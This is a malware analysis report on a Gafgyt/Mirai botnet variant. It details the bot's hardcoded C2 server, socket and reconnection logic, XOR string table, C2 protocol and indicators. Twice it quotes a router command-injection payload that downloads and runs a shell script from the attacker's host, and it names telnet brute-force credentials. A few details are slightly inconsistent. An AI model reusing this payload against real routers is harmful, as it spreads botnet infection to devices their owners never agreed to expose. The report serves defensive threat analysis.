# Transport Layer Specification: Gafgyt/Mirai Variant ("Deep Sorrow")

## Binary Identification

| Attribute | Value |
|-----------|-------|
| Binary Name | `deepsorrow` |
| Format | ELF 32-bit x86 (LE) |
| Compiler | GCC |
| Image Base | `0x08048000` |
| Function Count | 450 |
| Banner String | `im in deep sorrow.` |
| Process Name | `scanbot` |

---

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The C2 server address and port are **hardcoded** in the binary at compile time. There is no dynamic resolution, domain generation algorithm (DGA), or external configuration retrieval mechanism for the primary C2 endpoint.

The C2 address is stored in two forms:
1. As a binary `sockaddr_in` structure in the `.bss` section
2. As a human-readable IP string in the `.rodata` section (used by the Huawei exploit module)

### 1.2 C2 Address Construction

**Location:** Global variable at `0x0806ce48` (`.bss` section)

The C2 address is constructed as a `sockaddr_in` structure during the main loop initialization:

| Offset | Field | Value | Description |
|--------|-------|-------|-------------|
| `0x0806ce48` | `sin_family` | `0x0002` | `AF_INET` |
| `0x0806ce4a` | `sin_port` | `0xD146` | Port 53574 (network byte order) |
| `0x0806ce4c` | `sin_addr` | `0xB89F3C3E` | IP: 62.60.159.184 (little-endian) |

**Assembly code at `0x080485e5`-`0x080485f8`:**
```nasm
MOV word ptr [0x0806ce48], 0x0002        ; AF_INET
MOV dword ptr [0x0806ce4c], 0xB89F3C3E   ; IP: 62.60.159.184
MOV word ptr [0x0806ce4a], 0xD146        ; Port: 53574
MOV byte ptr [0x08068abc], 0x01          ; Connection state flag
```

### 1.3 Recovered C2 Address

| Parameter | Value | Notes |
|-----------|-------|-------|
| **IP Address** | `62.60.159.184` | Hardcoded |
| **Port** | `53574` (0xD146) | TCP |
| **Protocol** | TCP | `AF_INET / SOCK_STREAM` |
| **Alternative IP String** | `"62,60,159,184"` | At `0x0805f78e` (Huawei exploit) |

### 1.4 Huawei Exploit C2 Download URL

The Huawei router exploit module contains a hardcoded download URL embedded in the exploit payload at `0x080619b2`:

```
http://62,60,159,184/bins/kla.sh
```

Full exploit payload string:
```
action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget http://62,60,159,184/bins/kla.sh -O k;chmod +x k;./k;#"
```

This URL is used by compromised Huawei routers to download and execute a secondary payload (`kla.sh`).

### 1.5 Retrieval Logic (Pseudocode)

```
// C2 address is hardcoded - no retrieval logic needed
C2_ADDRESS = {
    family: AF_INET,           // 0x0002
    port: 0xD146,              // 53574 (network byte order)
    ip: 0xB89F3C3E             // 62.60.159.184 (little-endian storage)
}
```

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The C2 connection is established through a non-blocking TCP socket within the main select loop. The connection lifecycle is managed entirely within `main` at `0x0804830c`.

### 2.2 Socket Creation Sequence

**Socket Creation (at `0x0804850d`):**
```nasm
PUSH 0x0           ; protocol = 0 (default)
PUSH 0x1           ; type = SOCK_STREAM
PUSH 0x2           ; domain = AF_INET
CALL socket
```

**Socket Options Configuration:**

| Option | Level | Option Name | Value | Purpose |
|--------|-------|-------------|-------|---------|
| `SO_REUSEADDR` | `SOL_SOCKET (1)` | `2` | `1` | Allow port reuse |
| `TCP_KEEPIDLE` | `IPPROTO_TCP (6)` | `4` | `30` | Start keepalive after 30s idle |
| `TCP_KEEPINTVL` | `IPPROTO_TCP (6)` | `5` | `10` | Keepalive interval 10s |
| `TCP_KEEPCNT` | `IPPROTO_TCP (6)` | `6` | `3` | 3 keepalive probes before death |

**Socket Flags:**
- Non-blocking mode enabled via `fcntl` (retrieved with `getsockopt`, then `O_NONBLOCK` flag OR'd in)
- Assembly at `0x080485bf`: `OR AH, 0x08` sets `O_NONBLOCK`

### 2.3 Connection Establishment

**Non-blocking Connect (at `0x0804860a`):**
```nasm
PUSH 0x10              ; addrlen = 16
PUSH 0x0806ce48        ; &sockaddr_in
PUSH dword ptr [0x080642ac]  ; socket fd
CALL connect
```

### 2.4 Network Parameters Summary

| Parameter | Value | Source |
|-----------|-------|--------|
| Protocol | TCP | `socket(AF_INET, SOCK_STREAM, 0)` |
| C2 IP | `62.60.159.184` | Hardcoded at `0x0806ce4c` |
| C2 Port | `53574` | Hardcoded at `0x0806ce4a` |
| Socket Mode | Non-blocking | `O_NONBLOCK` flag |
| SO_REUSEADDR | `1` | `setsockopt` at `0x08048554` |
| TCP_KEEPIDLE | `30` seconds | `setsockopt` at `0x0804856d` |
| TCP_KEEPINTVL | `10` seconds | `setsockopt` at `0x08048587` |
| TCP_KEEPCNT | `3` | `setsockopt` at `0x080485a3` |
| Select Timeout | `30` seconds | Hardcoded in select call |

### 2.5 Connection Logic (Pseudocode)

```
GLOBAL c2_fd = -1
GLOBAL ctrl_fd = -1      // Single-instance control socket
GLOBAL heartbeat_counter = 0
GLOBAL connection_established = 0

FUNCTION establish_c2_connection():
    // Create TCP socket
    c2_fd = socket(AF_INET, SOCK_STREAM, 0)
    IF c2_fd == -1:
        RETURN

    // Set SO_REUSEADDR
    setsockopt(c2_fd, SOL_SOCKET, SO_REUSEADDR, 1, sizeof(int))

    // Configure TCP keepalive
    setsockopt(c2_fd, IPPROTO_TCP, TCP_KEEPIDLE, 30, sizeof(int))
    setsockopt(c2_fd, IPPROTO_TCP, TCP_KEEPINTVL, 10, sizeof(int))
    setsockopt(c2_fd, IPPROTO_TCP, TCP_KEEPCNT, 3, sizeof(int))

    // Enable non-blocking mode
    flags = getsockopt(c2_fd, SOL_SOCKET, SO_STATE)
    flags = flags | O_NONBLOCK
    getsockopt(c2_fd, SOL_SOCKET, SO_STATE, flags)

    // Construct sockaddr_in
    sockaddr = {
        sin_family: AF_INET,
        sin_port: 0xD146,          // 53574 (network byte order)
        sin_addr: 0xB89F3C3E       // 62.60.159.184 (little-endian)
    }

    // Non-blocking connect
    connect(c2_fd, &sockaddr, sizeof(sockaddr))
    connection_established = 1

FUNCTION main_select_loop():
    WHILE TRUE:
        // Clear fd_sets
        FD_ZERO(read_set)
        FD_ZERO(write_set)

        // Add control socket to read set
        IF ctrl_fd != -1:
            FD_SET(ctrl_fd, read_set)

        // Add C2 socket to appropriate set
        IF connection_established == 0:
            FD_SET(c2_fd, write_set)   // Waiting for connection
        ELSE:
            FD_SET(c2_fd, read_set)    // Ready to receive

        // Determine max fd for select
        max_fd = MAX(ctrl_fd, c2_fd) + 1

        // Select with 30-second timeout
        result = select(max_fd, read_set, write_set, NULL, timeout=30)

        IF result == -1:
            BREAK  // Error

        IF result == 0:
            // Timeout - send heartbeat
            send(c2_fd, 0x0000, 2, MSG_NOSIGNAL)
            heartbeat_counter++

            // Check heartbeat failure threshold
            IF heartbeat_counter > 119 AND c2_fd != -1:
                c2_backoff_retry()
                CONTINUE
            CONTINUE

        // Handle control socket (single-instance check)
        IF ctrl_fd readable:
            accept incoming connection
            kill_child_processes()
            kill(-session_id, SIGKILL)
            exit(0)

        // Handle C2 connection
        IF connection_established == 0:
            // Connection just established
            connection_established = 0  // Reset flag
            IF c2_fd writable:
                // Send authentication
                send(c2_fd, password_byte, 1, MSG_NOSIGNAL)
                send(c2_fd, password_length, 1, MSG_NOSIGNAL)
                IF password_length > 0:
                    send(c2_fd, password_string, password_length, MSG_NOSIGNAL)
                send(c2_fd, version_byte (0x03), 1, MSG_NOSIGNAL)
                send(c2_fd, local_ip_string, length, MSG_NOSIGNAL)
                CONTINUE

        IF c2_fd readable:
            // Read packet length header (2 bytes, network byte order)
            recv(c2_fd, &header, 2, MSG_NOSIGNAL)
            packet_length = ntohs(header)

            IF packet_length == 0:
                // Heartbeat acknowledgment
                recv(c2_fd, ack, 2, MSG_NOSIGNAL)
                CONTINUE

            IF packet_length > 0x2000:
                close(c2_fd)
                c2_fd = -1
                CONTINUE

            // Read packet data
            recv(c2_fd, packet_data, packet_length, MSG_NOSIGNAL)

            // Check for heartbeat command
            IF c2_check_heartbeat(packet_data, packet_length):
                kill_child_processes()
                CONTINUE

            // Parse and execute command
            c2_parse_command(packet_data, packet_length)
```

### 2.6 Reconnection Strategy

**Function:** `c2_backoff_retry` at `0x08048198`

| Parameter | Value | Notes |
|-----------|-------|-------|
| Initial Backoff | `1` second | Set in `DAT_080642b4` |
| Backoff Multiplier | `×2` | Exponential growth |
| Maximum Backoff | `60` seconds (0x3C) | Capped value |
| Maximum Retries | Unlimited | No retry counter limit |

**Reconnection Logic (Pseudocode):**
```
GLOBAL retry_delay = 1      // Initial delay in seconds

FUNCTION c2_backoff_retry():
    IF c2_fd != -1:
        close(c2_fd)
    c2_fd = -1

    // Sleep for current delay
    usleep(retry_delay * 1000000)  // Convert to microseconds

    // Exponential backoff
    retry_delay = retry_delay * 2

    // Cap at 60 seconds
    IF retry_delay > 60:
        retry_delay = 60
```

### 2.7 Heartbeat Mechanism

| Parameter | Value | Notes |
|-----------|-------|-------|
| Heartbeat Payload | `0x0000` (2 bytes) | Sent on select timeout |
| Heartbeat Interval | ~30 seconds | Once per select timeout |
| Failure Threshold | 119 heartbeats | ~59.5 minutes of no response |
| Timeout Period | 30 seconds | `select()` timeout value |

---

## 3. Single-Instance Enforcement

### 3.1 Observed Behavior

The `table_init` function at `0x080481f1` implements single-instance enforcement by binding to the same port used for C2 communication (53574). If binding fails due to `EADDRINUSE`, the malware attempts to connect to its own port to verify another instance is running.

### 3.2 Single-Instance Socket Configuration

| Parameter | Value | Notes |
|-----------|-------|-------|
| Socket Type | TCP | `AF_INET / SOCK_STREAM` |
| Bind Port | `53574` (0xD146) | Same as C2 port |
| Bind Address | `0.0.0.0` or local IP | Depends on `DAT_080642b0` flag |
| SO_REUSEADDR | `1` | Enabled |

### 3.3 Single-Instance Logic (Pseudocode)

```
GLOBAL single_instance_flag = 0

FUNCTION table_init():
    // Create control socket
    ctrl_fd = socket(AF_INET, SOCK_STREAM, 0)
    IF ctrl_fd == -1:
        RETURN

    // Set SO_REUSEADDR
    setsockopt(ctrl_fd, SOL_SOCKET, SO_REUSEADDR, 1, sizeof(int))

    // Get socket state flags
    flags = getsockopt(ctrl_fd, SOL_IP, 0)
    getsockopt(ctrl_fd, SOL_IP, flags | 0x800)

    // Determine bind address
    IF single_instance_flag == 0:
        bind_addr = local_ip    // Use actual local IP
    ELSE:
        bind_addr = 0x7F000001  // 127.0.0.1

    // Construct sockaddr_in for bind
    bind_addr_struct = {
        sin_family: AF_INET,
        sin_port: 0xD146,       // 53574 (network byte order)
        sin_addr: bind_addr
    }

    errno = 0
    result = bind(ctrl_fd, &bind_addr_struct, 16)

    IF result == 0:
        // Bind succeeded - we're the first instance
        // Listen for connections on this port
        listen(ctrl_fd, 1)
    ELSE:
        // Bind failed - check if due to address already in use
        IF errno == 99:  // EADDRINUSE
            single_instance_flag = 0

        // Try to connect to our own port
        connect_addr = {
            sin_family: AF_INET,
            sin_port: 0xD146,
            sin_addr: 0x00000000  // 0.0.0.0
        }
        connect(ctrl_fd, &connect_addr, 16)
        usleep(5)
        close(ctrl_fd)

        // Recursive call to retry
        table_init()
```

---

## 4. String Table Analysis

### 4.1 Observed Behavior

The binary contains an XOR-encrypted string table used for storing sensitive strings such as telnet commands, busybox applet names, and other operational strings. The strings are stored encrypted in the `.rodata` section and decrypted at runtime using the `table_toggle_val` function.

### 4.2 String Table Architecture

**Storage Structure:**

The string table uses two parallel arrays in the `.bss` section:

| Address | Purpose | Entry Size |
|---------|---------|------------|
| `0x0806ce60` | Pointer array (string data pointers) | 4 bytes per entry |
| `0x0806ce64` | Length array (string lengths) | 2 bytes per entry |

Each table entry is 8 bytes total (4 bytes pointer + 2 bytes length + 2 bytes padding).

**Initialization:**
- `table_init_strings` at `0x08054074` populates the table
- `table_set_entry` at `0x08054038` allocates memory and copies encrypted strings

### 4.3 Decryption Routine

**XOR Key:** `0xDEADBEEF`

The decryption function `table_toggle_val` at `0x08053fc6` applies all four bytes of the key sequentially to each data byte:

```c
FUNCTION table_toggle_val(index):
    key = 0xDEADBEEF
    key_bytes = [0xEF, 0xBE, 0xAD, 0xDE]  // Little-endian

    // Get string pointer and length from table
    offset = index * 8
    str_ptr = *(int*)(&DAT_0806ce60 + offset)
    str_len = *(ushort*)(&DAT_0806ce64 + offset)

    // XOR each byte with all key bytes sequentially
    FOR i FROM 0 TO str_len - 1:
        str_ptr[i] = str_ptr[i] XOR key_bytes[0]  // XOR with 0xEF
        str_ptr[i] = str_ptr[i] XOR key_bytes[1]  // XOR with 0xBE
        str_ptr[i] = str_ptr[i] XOR key_bytes[2]  // XOR with 0xAD
        str_ptr[i] = str_ptr[i] XOR key_bytes[3]  // XOR with 0xDE

// Effective single-byte XOR: 0xEF ^ 0xBE ^ 0xAD ^ 0xDE = 0x22
```

**Effective XOR Key:** `0x22` (single-byte equivalent)

### 4.4 Decryption Logic (Pseudocode)

```
XOR_KEY = 0xDEADBEEF
EFFECTIVE_XOR = 0x22  // 0xEF ^ 0xBE ^ 0xAD ^ 0xDE

FUNCTION decrypt_string(encrypted_data):
    result = EMPTY_BYTE_ARRAY
    FOR EACH byte IN encrypted_data:
        decrypted_byte = byte XOR 0x22
        APPEND decrypted_byte TO result
    RETURN result

FUNCTION table_retrieve_val(index, length_ptr):
    offset = index * 8
    str_ptr = *(int*)(&0x0806ce60 + offset)
    str_len = *(ushort*)(&0x0806ce64 + offset)

    IF length_ptr != NULL:
        *length_ptr = str_len

    RETURN str_ptr

FUNCTION table_toggle_val(index):
    // Decrypts (or re-encrypts) the string at the given index
    offset = index * 8
    str_ptr = *(int*)(&0x0806ce60 + offset)
    str_len = *(ushort*)(&0x0806ce64 + offset)

    FOR i FROM 0 TO str_len - 1:
        str_ptr[i] = str_ptr[i] XOR 0xEF
        str_ptr[i] = str_ptr[i] XOR 0xBE
        str_ptr[i] = str_ptr[i] XOR 0xAD
        str_ptr[i] = str_ptr[i] XOR 0xDE
```

### 4.5 Recovered String Table Entries

| Index | Encrypted Address | Length | Encrypted Data | Decrypted String | Purpose |
|-------|-------------------|--------|----------------|------------------|---------|
| `0x03` | `0x08061a40` | `0x15` | `76714d57...` | `"TSource Engine Query"` | Source Engine game query string |
| `0x0B` | `0x08061a56` | `0x06` | `514a474e4e22` | `"shell"` | Telnet/SSH command |
| `0x09` | `0x08061a5d` | `0x07` | `474c43404e4722` | `"enable"` | Telnet privilege escalation |
| `0x0A` | `0x08061a65` | `0x07` | `515b5156474f22` | `"system"` | Telnet command |
| `0x0C` | `0x08061a6d` | `0x03` | `514a22` | `"sh"` | Shell execution |
| `0x0D` | `0x08061a71` | `0x13` | `0d404b4c...` | `"/bin/busybox MIRAI"` | Busybox invocation |
| `0x0F` | `0x08061a85` | `0x18` | `6f6b70636b...` | `"MIRAI: applet not found"` | Busybox error message |
| `0x0E` | `0x08061a9e` | `0x09` | `4c414d505047415622` | `"ncorrect"` | Partial "incorrect" (length off by 1) |

**Note:** The string at index `0x0E` appears to be truncated. The full string "incorrect" is present in plaintext at `0x0806181f` in the `.rodata` section and is likely used for telnet authentication failure detection.

### 4.6 Additional Plaintext Strings (Not in XOR Table)

The following operational strings are stored in plaintext in `.rodata`:

| Address | String | Purpose |
|---------|--------|---------|
| `0x0805f681` | `"scanbot"` | Process name (PR_SET_NAME) |
| `0x0805f689` | `"im in deep sorrow."` | Startup banner |
| `0x0805f78e` | `"62,60,159,184"` | C2 IP for Huawei exploit |
| `0x08061730` | `"pmpsl"`, `"px86"` | Telnet credentials |
| `0x080618a0` | Various usernames/passwords | Telnet brute-force credentials |
| `0x080619b2` | Huawei exploit payload | Router exploit string |
| `0x080617a0` | `"POST /applyapp.cgi HTTP/1.1..."` | Huawei HTTP exploit template |

---

## 5. Huawei Router Exploit Module

### 5.1 Overview

The malware includes a dedicated module (`huawei_process_connections` at `0x0805330a`) that exploits Huawei routers to spread laterally. This module:

1. Scans random public IP addresses on port 443
2. Sends crafted HTTP POST requests to exploit the `SETROOTCERTIFICATE` CGI endpoint
3. Downloads and executes a secondary payload from the C2 server

### 5.2 Exploit Connection Parameters

| Parameter | Value | Notes |
|-----------|-------|-------|
| Target Port | `443` (0x01BB) | HTTPS |
| Target IP | Random valid public IP | `rand_valid_ip()` filters private ranges |
| Connection Type | TCP | `socket(AF_INET, SOCK_STREAM, 0)` |
| Max Connections | 64 | `0x40` entries in connection table |
| Entry Size | `0x418` bytes | Per-connection state |

### 5.3 Exploit Payload

The exploit sends two HTTP requests:

**First Request (Exploit):**
```
POST /applyapp.cgi HTTP/1.1
Host: <target_ip>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget http://62,60,159,184/bins/kla.sh -O k;chmod +x k;./k;#"
```

**Second Request (Confirmation):**
```
POST /applyapp.cgi HTTP/1.1
Host: <target_ip>
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

action_mode=APPLYAPP
```

### 5.4 Success Detection

The module checks for the following strings in the HTTP response:
- `"ASUS"` - Indicates ASUS router (not target)
- `"200 OK"` - HTTP success indicator

If response length is less than 0x65 bytes and doesn't contain success indicators, the connection is closed and reconnection is attempted.

---

## 6. DNS Resolution Module

### 6.1 Overview

The binary includes a custom DNS resolver (`dns_resolve_a` at `0x08053b0b`) that performs A record queries using a raw UDP socket connected to Google's public DNS server.

### 6.2 DNS Server Configuration

| Parameter | Value | Notes |
|-----------|-------|-------|
| DNS Server IP | `8.8.8.8` (0x08080808) | Google Public DNS |
| DNS Server Port | `53` (0x0035) | Standard DNS port |
| Protocol | UDP | `socket(AF_INET, SOCK_DGRAM, 0)` |
| Query Type | A record (0x0001) | IPv4 address resolution |
| Response Class | IN (0x0001) | Internet class |
| Max Retries | 5 | With 1ms delay between attempts |
| Response Timeout | 5 seconds | `select()` timeout |

### 6.3 DNS Resolution Logic (Pseudocode)

```
FUNCTION dns_resolve_a(domain_name):
    // Compress domain name for DNS query
    compressed_name = dns_compress_name(domain_name)
    query_length = strlen(compressed_name)

    // Generate random transaction ID
    tx_id = rand() & 0xFFFF

    // Build DNS query header
    dns_query = {
        id: tx_id,
        flags: 0x0100,           // Standard query, recursion desired
        qdcount: 0x0001,         // 1 question
        ancount: 0x0000,
        nscount: 0x0000,
        arcount: 0x0000,
        question: compressed_name + 0x0001 + 0x0001  // Type A, Class IN
    }

    // Create UDP socket
    socket_fd = socket(AF_INET, SOCK_DGRAM, 0)

    // DNS server address
    dns_server = {
        sin_family: AF_INET,
        sin_port: 0x0035,        // Port 53
        sin_addr: 0x08080808     // 8.8.8.8
    }

    // Retry up to 5 times
    FOR attempt FROM 1 TO 5:
        // Send query
        send(socket_fd, dns_query, query_length + 17, 0)

        // Wait for response with 5-second timeout
        result = select(socket_fd + 1, read_set, NULL, NULL, 5)

        IF result > 0:
            response = recvfrom(socket_fd, buffer, 2048, 0)

            // Validate response
            IF response.id == tx_id AND response.ancount > 0:
                // Parse A records
                results = []
                FOR EACH resource_record IN response:
                    IF record.type == 0x0001 AND record.class == 0x0001:
                        IF record.rdlength == 4:
                            ip = ntohl(record.rdata)
                            results.append(ip)

                IF results IS NOT EMPTY:
                    RETURN results

        // Brief delay before retry
        usleep(1)

    RETURN NULL  // Resolution failed
```

---

## 7. Authentication Protocol

### 7.1 Password Handling

The C2 password is passed as the first command-line argument (`argv[1]`) and is sent to the C2 server upon successful connection.

**Password Extraction (at `0x080483f1`):**
```
IF argc == 2:
    password_length = strlen(argv[1])
    IF password_length < 32:
        strcpy(c2_password_buffer, argv[1])
        memset(argv[1], 0, password_length)  // Clear from memory
```

### 7.2 Authentication Sequence

Upon successful C2 connection, the following data is sent:

| Step | Data | Size | Notes |
|------|------|------|-------|
| 1 | `password_byte` (from `0x0805f69c`) | 1 byte | Likely a protocol version or type indicator |
| 2 | `password_length` | 1 byte | Length of the password string |
| 3 | `password_string` | Variable | The actual password (if length > 0) |
| 4 | `version_byte` (`0x03`) | 1 byte | Protocol version |
| 5 | `local_ip_string` | Variable | Bot's local IP address |

### 7.3 Authentication Logic (Pseudocode)

```
FUNCTION send_authentication(c2_fd, password):
    // Send protocol byte
    send(c2_fd, 0x0805f69c, 1, MSG_NOSIGNAL)

    // Send password length
    password_len = strlen(password)
    send(c2_fd, password_len, 1, MSG_NOSIGNAL)

    // Send password if present
    IF password_len > 0:
        send(c2_fd, password, password_len, MSG_NOSIGNAL)

    // Send version byte
    send(c2_fd, 0x03, 1, MSG_NOSIGNAL)

    // Send local IP
    local_ip = get_local_ip()
    send(c2_fd, local_ip_string, local_ip_len, MSG_NOSIGNAL)
```

---

## 8. C2 Protocol

### 8.1 Packet Structure

| Offset | Size | Field | Notes |
|--------|------|-------|-------|
| 0 | 2 bytes | Packet Length | Network byte order, max 0x2000 |
| 2 | 2 bytes | Command Type | `0x0000` = heartbeat |
| 4 | 1 byte | Method ID | Attack method identifier |
| 5 | 1 byte | Target Count | Number of targets |
| 6 | Variable | Target Array | 24 bytes per target |
| - | Variable | Option Count | Number of options |
| - | Variable | Option Array | 8 bytes per option |

### 8.2 Command Types

| Command Type | Behavior |
|--------------|----------|
| `0x0000` | Heartbeat (payload byte must be 0x00 or 0x01) |
| Non-zero | Attack command with method ID and targets |

### 8.3 Heartbeat Check

```
FUNCTION c2_check_heartbeat(data, length):
    IF length > 4:
        packet_length = ntohs(data[0:2])
        IF packet_length == 0:
            command_byte = data[4]
            IF command_byte == 0xFF:
                toggle_attack_flag()
                RETURN TRUE
            IF command_byte == 0x00 OR command_byte == 0x01:
                kill_child_processes()
                RETURN TRUE
    RETURN FALSE
```

---

## 9. Analysis Gaps and Limitations

### 9.1 Unverified Parameters

| Parameter | Status | Reason |
|-----------|--------|--------|
| Password byte at `0x0805f69c` | **Unknown exact value** | Ghidra decompiler shows reference but value not explicitly readable |
| Exact connection timeout | **Inferred** | Based on select timeout of 30 seconds, but actual connect timeout may differ |
| DNS resolution usage | **Indirect evidence** | DNS resolver exists but no direct call chain from C2 retrieval was observed |

### 9.2 Observations

1. **No DNS-based C2 retrieval:** The C2 IP is hardcoded. The DNS resolver appears to be used for attack target resolution rather than C2 discovery.

2. **String table entry 0x0E truncation:** The "ncorrect" string is 9 bytes but "incorrect" is 10 bytes. This appears to be an off-by-one error in the string length specification during compilation.

3. **Single C2 endpoint:** Unlike some Mirai variants that support multiple C2 servers with failover, this variant has only one hardcoded C2 address.

4. **Port choice:** Port 53574 (0xD146) differs from the commonly documented Gafgyt port 53537 (0xD121), suggesting this is a distinct variant or operator configuration.

---

## 10. Summary of Indicators

### 10.1 Network Indicators

| Type | Value |
|------|-------|
| C2 IP | `62.60.159.184` |
| C2 Port | `53574/tcp` |
| Single-Instance Port | `53574/tcp` |
| DNS Server | `8.8.8.8:53/udp` |
| Huawei Scan Port | `443/tcp` |

### 10.2 URL Indicators

| URL | Purpose |
|-----|---------|
| `http://62,60,159,184/bins/kla.sh` | Huawei exploit payload download |

### 10.3 Cryptographic Constants

| Constant | Value | Purpose |
|----------|-------|---------|
| String Table XOR Key | `0xDEADBEEF` | Encrypts string table entries |
| Effective XOR Byte | `0x22` | Single-byte equivalent |

### 10.4 Behavioral Indicators

| Behavior | Detection Method |
|----------|-----------------|
| Banner output | Writes `im in deep sorrow.` to stdout |
| Process renaming | `prctl(PR_SET_NAME, "scanbot")` |
| Single-instance check | TCP bind to port 53574 |
| Watchdog interaction | Opens `/dev/watchdog` or `/dev/misc/watchdog` |
| Daemonization | Fork + setsid + close std FDs |
| Heartbeat pattern | 2-byte `0x0000` every 30 seconds |
